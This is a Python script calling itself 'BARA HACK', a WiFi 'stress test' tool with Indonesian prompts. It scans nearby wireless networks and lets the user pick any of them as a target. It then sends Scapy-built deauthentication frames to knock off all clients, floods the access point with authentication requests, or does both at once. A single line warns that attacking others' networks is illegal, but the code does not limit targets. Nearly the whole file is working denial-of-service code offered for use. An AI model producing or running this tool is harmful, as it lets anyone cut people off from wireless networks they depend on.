import os
import sys
import time
import random
import threading
import subprocess
from colorama import Fore, init

init(autoreset=True)


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


# ============ BANNER ============
def banner():
    clear()
    print(f"""{Fore.RED}
    ██████╗  █████╗ ██████╗  █████╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ██████╔╝███████║██████╔╝███████║    ███████║███████║██║     █████╔╝ 
    ██╔══██╗██╔══██║██╔══██╗██╔══██║    ██╔══██║██╔══██║██║     ██╔═██╗ 
    ██████╔╝██║  ██║██║  ██║██║  ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{Fore.CYAN}
                    ╔══════════════════════════════════════╗
                    ║        BARA HACK v1.0                ║
                    ║     WiFi Stress Test Tool            ║
                    ║          By: BARA                    ║
                    ╚══════════════════════════════════════╝
{Fore.RESET}""")


# ============ CEK ADMIN ============
def is_admin():
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return os.geteuid() == 0


def require_admin():
    if not is_admin():
        print(f"{Fore.RED}[!] Script ini butuh akses ADMIN.{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Tutup, buka PowerShell as Administrator, jalanin lagi.{Fore.RESET}")
        input(f"\n{Fore.CYAN}ENTER keluar...{Fore.RESET}")
        sys.exit(1)


# ============ SCAN WIFI ============
def scan_wifi():
    """Scan WiFi sekitar pake netsh (Windows) atau iwlist (Linux)."""
    clear()
    print(f"{Fore.CYAN}═══════════ SCAN WIFI SEKITAR ═══════════{Fore.RESET}\n")
    print(f"{Fore.YELLOW}[*] Scanning...{Fore.RESET}\n")

    results = []

    if os.name == 'nt':
        # Windows
        try:
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                encoding='utf-8', errors='ignore'
            )
            ssid = None
            bssid = None
            signal = None
            channel = None

            for line in out.splitlines():
                line = line.strip()
                if line.startswith("SSID") and ":" in line:
                    ssid = line.split(":", 1)[1].strip()
                elif line.startswith("BSSID") and ":" in line:
                    bssid = line.split(":", 1)[1].strip()
                elif line.startswith("Signal") and ":" in line:
                    signal = line.split(":", 1)[1].strip()
                elif line.startswith("Channel") and ":" in line:
                    channel = line.split(":", 1)[1].strip()
                    if ssid and bssid:
                        results.append({
                            "ssid": ssid,
                            "bssid": bssid,
                            "signal": signal,
                            "channel": channel
                        })
                        bssid = None
                        signal = None
                        channel = None
        except Exception as e:
            print(f"{Fore.RED}[!] Error scan: {e}{Fore.RESET}")
            return []
    else:
        # Linux
        try:
            out = subprocess.check_output(
                ["sudo", "iwlist", "wlan0", "scan"],
                encoding='utf-8', errors='ignore'
            )
            ssid = None
            bssid = None
            signal = None
            channel = None
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("ESSID:"):
                    ssid = line.split(":", 1)[1].strip('"')
                elif line.startswith("Address:"):
                    bssid = line.split(":", 1)[1].strip()
                elif "Signal level=" in line:
                    signal = line.split("Signal level=")[1].split()[0]
                elif "Channel:" in line:
                    channel = line.split("Channel:")[1].strip()
                    if ssid and bssid:
                        results.append({
                            "ssid": ssid,
                            "bssid": bssid,
                            "signal": signal,
                            "channel": channel
                        })
                        ssid = None
                        bssid = None
                        signal = None
                        channel = None
        except Exception as e:
            print(f"{Fore.RED}[!] Error scan: {e}{Fore.RESET}")
            return []

    if not results:
        print(f"{Fore.RED}[!] Gak ada WiFi kedetek.{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Pastiin WiFi adapter nyala + akses admin.{Fore.RESET}")
        return []

    # Tampilin
    print(f"{Fore.GREEN}Found {len(results)} WiFi:{Fore.RESET}\n")
    print(f"{Fore.CYAN}{'No':<4} {'SSID':<25} {'BSSID':<20} {'Signal':<8} {'Channel':<8}{Fore.RESET}")
    print(f"{Fore.CYAN}{'-'*70}{Fore.RESET}")
    for i, w in enumerate(results, 1):
        print(f"{Fore.YELLOW}{i:<4}{Fore.WHITE} {w['ssid'][:24]:<25} {w['bssid']:<20} {str(w['signal'])[:7]:<8} {str(w['channel']):<8}{Fore.RESET}")

    return results


# ============ DEAUTH ATTACK ============
def deauth_attack(bssid, client=None, count=0, iface="wlan0"):
    """Kirim paket deauth ke BSSID target."""
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
    except ImportError:
        print(f"{Fore.RED}[!] Scapy gak keinstall. Jalanin: pip install scapy{Fore.RESET}")
        return

    if os.name == 'nt':
        print(f"{Fore.RED}[!] Windows gak support deauth via Scapy.{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Pake Kali Linux / WSL2 + USB WiFi adapter.{Fore.RESET}")
        return

    conf.iface = iface

    # Target: broadcast (semua client) atau client spesifik
    dst = client if client else "ff:ff:ff:ff:ff:ff"

    packet = RadioTap() / Dot11(
        addr1=dst,
        addr2=bssid,
        addr3=bssid
    ) / Dot11Deauth(reason=7)

    sent = 0
    print(f"{Fore.RED}[*] Deauth attack ke {bssid}...{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Tekan CTRL+C buat stop.{Fore.RESET}\n")

    try:
        while True:
            try:
                sendp(packet, iface=iface, verbose=False)
                sent += 1
                print(f"\r{Fore.GREEN}[+] Paket terkirim: {sent}{Fore.RESET}", end="")
            except KeyboardInterrupt:
                raise
            except Exception:
                pass

            if count > 0 and sent >= count:
                break
            time.sleep(0.001)
    except KeyboardInterrupt:
        pass

    print(f"\n\n{Fore.GREEN}[✓] Total paket: {sent}{Fore.RESET}")


# ============ AUTH FLOOD ============
def auth_flood(bssid, iface="wlan0"):
    """Kirim ribuan authentication request."""
    try:
        from scapy.all import RadioTap, Dot11, Dot11Auth, sendp, conf
    except ImportError:
        print(f"{Fore.RED}[!] Scapy gak keinstall.{Fore.RESET}")
        return

    if os.name == 'nt':
        print(f"{Fore.RED}[!] Windows gak support auth flood via Scapy.{Fore.RESET}")
        return

    conf.iface = iface

    packet = RadioTap() / Dot11(
        addr1=bssid,
        addr2="00:11:22:33:44:55",
        addr3=bssid
    ) / Dot11Auth(algo=0, seqnum=1, status=0)

    sent = 0
    print(f"{Fore.RED}[*] Auth flood ke {bssid}...{Fore.RESET}\n")

    try:
        while True:
            try:
                sendp(packet, iface=iface, verbose=False)
                sent += 1
                print(f"\r{Fore.GREEN}[+] Paket terkirim: {sent}{Fore.RESET}", end="")
            except KeyboardInterrupt:
                raise
            except Exception:
                pass
            time.sleep(0.001)
    except KeyboardInterrupt:
        pass

    print(f"\n\n{Fore.GREEN}[✓] Total paket: {sent}{Fore.RESET}")


# ============ HACK WIFI MENU ============
def hack_wifi():
    clear()
    print(f"""{Fore.RED}
    ╔══════════════════════════════════════╗
    ║          HACK WIFI MODE              ║
    ╚══════════════════════════════════════╝
    {Fore.RESET}""")

    # Step 1: Scan
    wifi_list = scan_wifi()

    if not wifi_list:
        input(f"\n{Fore.CYAN}ENTER balik...{Fore.RESET}")
        banner()
        menu()
        return

    # Step 2: Pilih WiFi
    print()
    try:
        idx = int(input(f"{Fore.CYAN}Pilih nomor WiFi target: {Fore.WHITE}")) - 1
        if idx < 0 or idx >= len(wifi_list):
            raise ValueError
    except:
        print(f"{Fore.RED}[!] Pilihan salah.{Fore.RESET}")
        time.sleep(2)
        hack_wifi()
        return

    target = wifi_list[idx]
    bssid = target["bssid"]
    ssid = target["ssid"]

    clear()
    print(f"""{Fore.GREEN}
    ╔══════════════════════════════════════╗
    ║          TARGET SELECTED             ║
    ╚══════════════════════════════════════╝
    {Fore.RESET}""")
    print(f"{Fore.CYAN}SSID    : {Fore.WHITE}{ssid}")
    print(f"{Fore.CYAN}BSSID   : {Fore.WHITE}{bssid}")
    print(f"{Fore.CYAN}Signal  : {Fore.WHITE}{target['signal']}")
    print(f"{Fore.CYAN}Channel : {Fore.WHITE}{target['channel']}")
    print()

    # Step 3: Konfirmasi
    print(f"{Fore.YELLOW}[?] Mulai serangan ke WiFi ini? (y/n){Fore.RESET}")
    print(f"{Fore.RED}[!] Pastikan ini WiFi KAMU SENDIRI. Serang WiFi orang = ILEGAL.{Fore.RESET}")
    konfirm = input(f"{Fore.CYAN}> {Fore.WHITE}").strip().lower()

    if konfirm != 'y':
        print(f"{Fore.YELLOW}[!] Dibatalkan.{Fore.RESET}")
        time.sleep(1)
        banner()
        menu()
        return

    # Step 4: Pilih metode
    clear()
    print(f"""{Fore.RED}
    ╔══════════════════════════════════════╗
    ║          PICK METHOD                 ║
    ╚══════════════════════════════════════╝
    {Fore.RESET}""")
    print(f"{Fore.YELLOW}[1]{Fore.WHITE} Deauth Attack (kick semua client)")
    print(f"{Fore.YELLOW}[2]{Fore.WHITE} Auth Flood (overload router)")
    print(f"{Fore.YELLOW}[3]{Fore.WHITE} Both (paling ganas)")
    print(f"{Fore.YELLOW}[0]{Fore.WHITE} Balik\n")

    metode = input(f"{Fore.CYAN}> {Fore.WHITE}").strip()

    # Step 5: Interface (Linux only)
    if os.name != 'nt':
        iface = input(f"{Fore.CYAN}Interface (default: wlan0mon): {Fore.WHITE}").strip() or "wlan0mon"
    else:
        iface = "wlan0mon"

    # Step 6: Eksekusi
    clear()
    print(f"""{Fore.RED}
    ╔══════════════════════════════════════╗
    ║        SERANGAN DIMULAI              ║
    ╚══════════════════════════════════════╝
    {Fore.RESET}""")
    print(f"{Fore.CYAN}Target  : {Fore.WHITE}{ssid} ({bssid})")
    print(f"{Fore.CYAN}Metode  : {Fore.WHITE}{metode}")
    print(f"{Fore.CYAN}Iface   : {Fore.WHITE}{iface}")
    print(f"{Fore.RED}[!] CTRL+C buat stop.{Fore.RESET}\n")

    try:
        if metode == "1":
            deauth_attack(bssid, iface=iface)
        elif metode == "2":
            auth_flood(bssid, iface=iface)
        elif metode == "3":
            t1 = threading.Thread(target=deauth_attack, args=(bssid,), kwargs={"iface": iface}, daemon=True)
            t2 = threading.Thread(target=auth_flood, args=(bssid,), kwargs={"iface": iface}, daemon=True)
            t1.start()
            t2.start()
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
        else:
            print(f"{Fore.YELLOW}[!] Balik ke menu.{Fore.RESET}")
    except KeyboardInterrupt:
        pass

    print(f"\n{Fore.GREEN}[✓] Serangan berhenti.{Fore.RESET}")
    input(f"\n{Fore.CYAN}ENTER balik...{Fore.RESET}")
    banner()
    menu()


# ============ MENU ============
def menu():
    print(f"{Fore.YELLOW}[1]{Fore.WHITE} Hack WiFi")
    print(f"{Fore.YELLOW}[2]{Fore.WHITE} Keluar")
    print()
    pilih = input(f"{Fore.CYAN}BARA@HACK:~# {Fore.WHITE}").strip()

    if pilih == "1":
        hack_wifi()
    elif pilih == "2":
        print(f"{Fore.RED}[!] Keluar...{Fore.RESET}")
        sys.exit()
    else:
        print(f"{Fore.RED}[!] Pilihan salah!{Fore.RESET}")
        time.sleep(1)
        banner()
        menu()


# ============ MAIN ============
if __name__ == "__main__":
    require_admin()
    try:
        banner()
        menu()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stop.{Fore.RESET}")
        sys.exit()
